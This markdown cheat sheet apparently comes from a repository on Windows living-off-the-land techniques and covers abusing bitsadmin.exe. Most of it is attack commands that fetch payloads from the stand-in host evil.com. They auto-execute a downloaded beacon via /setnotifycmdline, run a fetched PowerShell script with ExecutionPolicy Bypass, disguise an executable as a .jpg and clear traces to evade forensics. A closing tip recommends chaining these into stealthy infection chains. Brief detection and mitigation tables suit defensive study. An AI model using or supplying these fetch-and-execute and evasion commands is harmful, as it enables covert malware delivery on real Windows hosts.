# 📦 BITSAdmin - Living Off the Land

**BITSAdmin.exe** is a legacy Windows utility used to manage Background Intelligent Transfer Service (BITS) jobs — normally for things like Windows Update. But attackers abuse it to **quietly download, upload, and execute malicious payloads** under the radar.

> ⚠️ BITSAdmin is deprecated in favor of PowerShell’s BITS module — but still available on many systems and extremely stealthy.

---

## 🛠️ What It Does
- Downloads or uploads files using idle bandwidth
- Transfers continue after reboot
- Executes a command after download completes
- Runs in the background with minimal alerts/logs

---

## 💣 Common LotL BITSAdmin Techniques

### 1. Download a Remote Payload
```cmd
bitsadmin /transfer job1 http://evil.com/malware.exe C:\Users\Public\malware.exe
```
✅ Stealthy payload delivery without browser or PowerShell

---

### 2. Set a Notification Command (Post-Download Execution)
```cmd
bitsadmin /create job2
bitsadmin /addfile job2 http://evil.com/beacon.exe C:\Users\Public\beacon.exe
bitsadmin /setnotifycmdline job2 "C:\Users\Public\beacon.exe" NULL
bitsadmin /resume job2
```
✅ Full download + auto-execution chain without touching PowerShell

---

### 3. Use BITS to Download PowerShell Script
```cmd
bitsadmin /transfer psjob http://evil.com/script.ps1 C:\Users\Public\script.ps1
powershell -ExecutionPolicy Bypass -File C:\Users\Public\script.ps1
```
✅ Download & run malware in two stages

---

### 4. Stealth Download Using Suspicious File Extension
```cmd
bitsadmin /transfer drop http://evil.com/update.jpg C:\Users\Public\payload.exe
```
✅ Hides under image extension — defenders often miss this

---

### 5. Cleanup After Execution
```cmd
bitsadmin /complete job2
```
✅ Removes traces of the BITS job — avoids detection by log forensics

---

## 🕵️‍♂️ Detection Tips
| Indicator | Method |
|-----------|--------|
| `bitsadmin` command-line use | Log and alert on suspicious file types or remote URLs |
| `.exe` downloads from strange domains | Monitor for unusual file paths |
| Use of `/setnotifycmdline` | Indicates possible auto-execution behavior |
| Abuse of BITS in high-privilege contexts | Flag for further review |

---

## 🔐 Mitigation Strategies
- Block or disable `bitsadmin.exe` via AppLocker/WDAC
- Monitor for unexpected BITS job creation via event logs
- Alert on `bitsadmin` + uncommon file types (`.exe`, `.ps1`, etc.)
- Limit internet access on sensitive hosts to prevent abuse

---

> 💡 Combine `bitsadmin` with scheduled tasks, mshta, or certutil for stealthy infection chains. Check the Labs folder to simulate a full flow.
